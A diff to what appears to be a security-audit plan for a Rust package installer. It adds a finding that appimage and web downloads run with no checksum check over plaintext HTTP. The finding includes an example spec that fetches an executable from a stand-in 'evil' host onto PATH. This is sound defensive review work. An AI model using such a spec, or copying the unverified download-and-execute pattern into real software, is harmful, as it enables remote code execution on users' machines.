@@ -1277,6 +1277,19 @@ spec carries untrusted URLs and `@`-options to the filesystem with no validation
   **Solution TBD** (candidates: reject `@bin`/`@target` values containing a path separator or `..`;
   or resolve the final path and refuse if it escapes `~/.local/bin`). Do not implement until decided.
 
+- **SEC2 — SERIOUS. Download-and-execute with no integrity check; plaintext HTTP allowed
+  (appimage/web).** `appimage.rs:108-148`: `url = spec.name`, `client.get(url)` accepts any `http://`
+  URL, writes the response, `chmod 0o755`, and symlinks it into `~/.local/bin` — with **no checksum
+  option at all** for appimage. `appimage:http://evil/foo.AppImage` places an attacker-controlled,
+  network-fetched executable on PATH with zero verification; running `foo` later is RCE. `web.rs`
+  has the same download→`0o755`→PATH flow, but `@sha256` is *optional* and `http://` is accepted, so
+  a bare `web:` spec is download-and-run-unverified. `github.rs` is the same optional-checksum pattern
+  but over HTTPS to api.github.com (lower risk). `core/security.rs::verify_checksum` is correct — the
+  gap is that nothing forces it to run and nothing forbids `http://`; reqwest also follows up to 10
+  redirects, so an `https://` seed can be bounced to `http://`. Reachable, high confidence. **Solution
+  TBD** (candidates: reject non-`https` unless explicit opt-in; require `@sha256` or loudly mark an
+  unverified install; wire appimage into `verify_checksum`). Do not implement until decided.
+
 ## Phase 6 — The five containers
 
 `DISTROS="ubuntu fedora arch alpine tools" ./docker/integration/run.sh jq`
